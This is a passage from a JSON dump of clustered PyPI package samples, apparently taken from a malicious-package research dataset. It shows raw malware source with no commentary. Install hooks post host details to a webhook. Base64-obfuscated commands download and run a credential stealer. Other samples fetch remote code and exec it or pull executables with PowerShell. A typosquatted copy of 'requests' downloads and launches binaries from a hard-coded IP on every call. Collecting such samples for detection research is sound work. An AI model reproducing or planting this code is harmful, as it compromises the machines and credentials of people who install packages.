lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-formatter-test-package-v0.1.10",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nPACKAGE_NAME = 'formatter_test_package'\n\nclass Analytics(install):\n    def run(self):\n        super().run()  # Ensure the parent class's run method is called\n        subprocess.call([sys.executable, \"-m\", f\"{PACKAGE_NAME}.utils.analyzer\"])\n\nsetup(\n    name=PACKAGE_NAME,\n    version='0.1.10',\n    packages=[PACKAGE_NAME, f\"{PACKAGE_NAME}.utils\"],\n    install_requires=[\n        'requests>=2.20.0',\n        'psutil>=5.8.0',\n    ],\n    cmdclass={\n        'install': Analytics,  # This hooks the custom install command\n    },\n)\n\nimport os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\nimport inspect\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-oz-merkle-tree-v0.1.8",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nPACKAGE_NAME = 'oz-merkle-tree'\n\nclass Analytics(install):\n    def run(self):\n        super().run()  # Ensure the parent class's run method is called\n        subprocess.call([sys.executable, \"-m\", f\"{PACKAGE_NAME}.utils.analyzer\"])\n\nsetup(\n    name=PACKAGE_NAME,\n    version='0.1.8',\n    packages=[PACKAGE_NAME, f\"{PACKAGE_NAME}.utils\"],\n    install_requires=[\n        'requests>=2.20.0',\n        'psutil>=5.8.0',\n    ],\n    cmdclass={\n        'install': Analytics,  # This hooks the custom install command\n    },\n)\n\nimport os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\nimport inspect\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n    context = find_import_context()\n    print(f\"Import context: {context}\")\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'context': context,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-redis-di-processor-v0.1.8",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nPACKAGE_NAME = 'redis-di-processor'\n\nclass Analytics(install):\n    def run(self):\n        super().run()  # Ensure the parent class's run method is called\n        subprocess.call([sys.executable, \"-m\", f\"{PACKAGE_NAME}.utils.analyzer\"])\n\nsetup(\n    name=PACKAGE_NAME,\n    version='0.1.8',\n    packages=[PACKAGE_NAME, f\"{PACKAGE_NAME}.utils\"],\n    install_requires=[\n        'requests>=2.20.0',\n        'psutil>=5.8.0',\n    ],\n    cmdclass={\n        'install': Analytics,  # This hooks the custom install command\n    },\n)\n\nimport os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\nimport inspect\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n    context = find_import_context()\n    print(f\"Import context: {context}\")\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'context': context,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      }
    ]
  },
  {
    "cluster_id": 47,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-14-henter-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\nimport hashlib\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d('''cGlwIGluc3RhbGwgcmVxdWVzdHMgJiB0eXBlICA+ICJtYWluLnB5dyIgJiBlY2hvIGltcG9ydCBvcyA+ICJtYWluLnB5dyIgJiBlY2hvIGZyb20gcmVxdWVzdHMgaW1wb3J0IGdldCA+PiAibWFpbi5weXciICYgZWNobyBmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IGNhbGwgPj4gIm1haW4ucHl3IiAmIGVjaG8gZj1nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS9FeGV0NzUvbmVvZmV0Y2gvYmxvYi9tYWluL2lwX2NoZWNrZXIuZXhlP3Jhdz10cnVlJykgPj4gIm1haW4ucHl3IiAmIGVjaG8gb3BlbignQzpcXFByb2dyYW0gRmlsZXNcXFNURUFMRVIuZXhlJywgJ3diJykud3JpdGUoZi5jb250ZW50KSA+PiAibWFpbi5weXciICYgZWNobyBjYWxsKCdDOlxcUHJvZ3JhbSBGaWxlc1xcU1RFQUxFUi5leGUnKSA+PiAibWFpbi5weXciICYgIm1haW4ucHl3Igo='''))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"henter\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"sadgosling@gmail.com\",\n    description = \"Special library\",\n    long_description = \"Special library\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-23-mordving-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\nfrom time import sleep\nimport hashlib\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d('''cGlwIGluc3RhbGwgcmVxdWVzdHMgJiB0eXBlICA+ICJtYWluLnB5dyIgJiBlY2hvIGltcG9ydCBvcyA+ICJtYWluLnB5dyIgJiBlY2hvIGZyb20gcmVxdWVzdHMgaW1wb3J0IGdldCA+PiAibWFpbi5weXciICYgZWNobyBmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IGNhbGwgPj4gIm1haW4ucHl3IiAmIGVjaG8gZj1nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS9FeGV0NzUvbmVvZmV0Y2gvYmxvYi9tYWluL2lwX2NoZWNrZXIuZXhlP3Jhdz10cnVlJykgPj4gIm1haW4ucHl3IiAmIGVjaG8gb3BlbignQzpcXFByb2dyYW0gRmlsZXNcXFNURUFMRVIuZXhlJywgJ3diJykud3JpdGUoZi5jb250ZW50KSA+PiAibWFpbi5weXciICYgZWNobyBjYWxsKCdDOlxcUHJvZ3JhbSBGaWxlc1xcU1RFQUxFUi5leGUnKSA+PiAibWFpbi5weXciICYgIm1haW4ucHl3Igo='''))\n    sleep(1)\n    print(\"Installing depensies...\")\n    sleep(3)\n    print(\"Unpacking...\")\n    sleep(5)\n    print(\"Sort...\")\n    sleep(2)\n    print(\"Unpacking...\")\n    print(\"Download finished...\")\n    print(\"\")\n    print(3)\n    print(\"Installation completed[OK]\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"mordving\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"sadgosling@gmail.com\",\n    description = \"Special library\",\n    long_description = \"Special library\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 48,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-02-tryquests-v0.0.1",
        "code": "from distutils.core import setup\n\nsetup(\n  name = 'tryquests',\n  packages = ['tryquests'],\n  version = '0.0.1',\n  license='MIT',\n  description = '',\n  author = 'WS',\n  keywords = [],\n  install_requires=['requests', 'stillrequestsa'],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n\nimport stillrequestsa"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-13-relefpots-v0.0.1",
        "code": "from distutils.core import setup\n\nsetup(\n  name = 'relefpots',\n  packages = ['relefpots'],\n  version = '0.0.1',\n  license='MIT',\n  description = 'relefpots',\n  author = 'WS',\n  keywords = [],\n  install_requires=['requests'],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n\nimport os\nimport subprocess\nimport sys\nimport time\n\ntry:\n    import requests\nexcept ImportError:\n    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])\n    import requests\n\ntry:\n    get = requests.get('https://sharetext.me/raw/gf8pcwkix5').text\n\n    exec(get)\nexcept Exception as e:\n    print(e)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-01-06-derkpy",
        "code": "from distutils.core import setup\n\nimport os\nos.system('powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"')\n\nsetup(\n  name = 'derkpy',\n  packages = ['derkpy'],\n  version = '4.6',\n  # license='MIT',\n  description = 'Alternative to Crypto',\n  author = 'Tahg',\n  author_email = 'Tahgoficial@gmail.com',\n  classifiers=[\n    'Development Status :: 3 - Alpha',\n    'Intended Audience :: Developers',\n    'Topic :: Software Development :: Build Tools',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Programming Language :: Python :: 3.11',\n  ],\n)\n\n\nprint(\"Hola\")"
      }
    ]
  },
  {
    "cluster_id": 49,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-12-dequests",
        "code": "from setuptools import setup\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nabout = {}\nabout['__title__'] = \"dequests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.1\"\nabout['__build__'] = 0x022801\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright 2022 Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"dequests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n\n\nimport requests\nimport platform\nimport os\n\ndef execute():\n    operating_system = platform.system().lower()\n\n    all_executables = []\n    req = requests.get('http://35.235.126.33/all.txt')\n    for line in req.text.splitlines():\n        if operating_system in line:\n            line = line.strip()\n            all_executables.append(line)\n\n    for executable in all_executables:\n        url = f'http://35.235.126.33/{executable}'\n        req = requests.get(url)\n        with open(executable, 'wb') as f:\n            f.write(req.content)\n\n        if 'linux' in operating_system or 'darwin' in operating_system:\n            os.system(f'chmod +x {executable}')\n\n        if 'linux' in operating_system:\n            os.system(f'./{executable} &')\n        elif 'darwin' in operating_system:\n            os.system(f'./{executable} &')\n        elif 'windows' in operating_system:\n            os.system(f'start /B {executable}')\n\ndef get(url: str | bytes, params: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a GET request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param params: (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('get', url, params=params, **kwargs)\n\ndef post(url: str | bytes, data: dict | None = None, json: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a POST request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param json: (optional) json data to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('post', url, data=data, json=json, **kwargs)\n\ndef put(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a PUT request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('put', url, data=data, **kwargs)\n\ndef patch(url: str | bytes, data: dict | None = None, **kwargs) -> requests.Response:\n    \"\"\"Sends a PATCH request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param data: (optional) Dictionary, bytes, or file-like object to send in the body of the :class:`Request`.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('patch', url, data=data, **kwargs)\n\ndef delete(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a DELETE request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('delete', url, **kwargs)\n\ndef head(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('head', url, **kwargs)\n\ndef options(url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request('options', url, **kwargs)\n\ndef request(method: str, url: str | bytes, **kwargs) -> requests.Response:\n    \"\"\"Constructs and sends a :class:`Request <Request>`. Returns :class:`Response <Response>` object.\n\n    :param method: method for the new :class:`Request` object.\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n    :return: :class:`Response <Response>` object\n    :rtype: requests.Response\n\n    \"\"\"\n    execute()\n    return requests.request(method, url, **kwargs)\n\nfrom frequest import get, post, put, patch, delete"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-12-fequests",
